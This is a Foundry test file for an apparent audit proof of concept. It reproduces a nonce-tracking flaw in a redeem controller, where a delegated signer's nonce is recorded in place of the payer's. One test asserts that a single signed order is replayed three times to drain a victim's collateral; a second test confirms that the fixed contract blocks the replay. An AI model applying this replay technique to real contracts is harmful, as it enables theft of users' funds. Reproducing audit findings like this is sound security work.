// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    Controller,
    ControllerFixed,
    MiniToken,
    AssetToken,
    Manager,
    Order,
    Signature
} from "./64973-redeem-nonce-mis-tracked-enables-replay-spearbit-none-tenbin.sol";

contract RedeemNonceReplayTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x000000000000000000000000000000000000b0b0;
    address internal constant DELEGATE = 0x00000000000000000000000000000000de1E6A7E;

    uint256 internal constant REPLAYS = 3;
    uint256 internal constant COLLATERAL_AMOUNT = 1000 ether;
    uint256 internal constant ASSET_AMOUNT = 500 ether;
    uint256 internal constant NONCE = 42;

    // ── Exploit: one delegated redeem order is replayed 3x, draining collateral ──
    function test_exploit_delegatedOrderReplayedDrainsCollateral() public {
        Exploit e = new Exploit();
        e.run();

        // One signed order transferred 3 * collateral_amount to the attacker.
        assertEq(e.attackerCollateral(), REPLAYS * COLLATERAL_AMOUNT, "attacker drained 3x from one order");

        MiniToken collateral = MiniToken(e.collateralAddr());
        assertEq(collateral.balanceOf(ATTACKER), REPLAYS * COLLATERAL_AMOUNT, "attacker holds 3x collateral");

        // The victim's assets were burned once per replay (all 3x consumed).
        AssetToken assetToken = AssetToken(e.assetAddr());
        assertEq(assetToken.balanceOf(VICTIM), 0, "victim assets fully burned");
        assertEq(e.victimAssetBurned(), REPLAYS * ASSET_AMOUNT, "victim burned 3x asset_amount");

        // The payer's nonce slot was never consumed (still replayable).
        Controller controller = Controller(e.controllerAddr());
        assertFalse(controller.nonces(VICTIM, NONCE), "payer nonce never recorded");
        // Meanwhile the delegated signer's slot WAS written (the mis-tracking).
        assertTrue(controller.nonces(DELEGATE, NONCE), "signer nonce recorded instead");
    }

    // ── Negative control: the recommended fix consumes the payer nonce → 2nd redeem reverts ──
    function test_control_fixedConsumesPayerNonce_blocksReplay() public {
        MiniToken collateral = new MiniToken("Collateral", "COLL");
        AssetToken assetToken = new AssetToken("Asset", "AST");
        Manager mgr = new Manager();
        ControllerFixed controller = new ControllerFixed(address(mgr), address(assetToken));

        assetToken.setBurner(address(controller));
        controller.grantMinter(address(this));

        collateral.mint(address(mgr), REPLAYS * COLLATERAL_AMOUNT);
        mgr.approveCollateral(address(collateral), address(controller), type(uint256).max);
        assetToken.mint(VICTIM, REPLAYS * ASSET_AMOUNT);

        Order memory order = Order({
            payer: VICTIM,
            recipient: ATTACKER,
            collateral_token: address(collateral),
            collateral_amount: COLLATERAL_AMOUNT,
            asset_amount: ASSET_AMOUNT,
            nonce: NONCE
        });
        Signature memory sig = Signature({signer: DELEGATE});

        // First redeem succeeds and transfers exactly one order's worth.
        controller.redeem(order, sig);
        assertEq(collateral.balanceOf(ATTACKER), COLLATERAL_AMOUNT, "first redeem paid once");

        // Replaying the SAME order now reverts: the payer's nonce is consumed.
        vm.expectRevert(bytes("nonce used"));
        controller.redeem(order, sig);

        // Attacker never received more than the single legitimate order.
        assertEq(collateral.balanceOf(ATTACKER), COLLATERAL_AMOUNT, "replay blocked, no extra drain");
        assertTrue(controller.nonces(VICTIM, NONCE), "fixed path records payer nonce");
    }
}
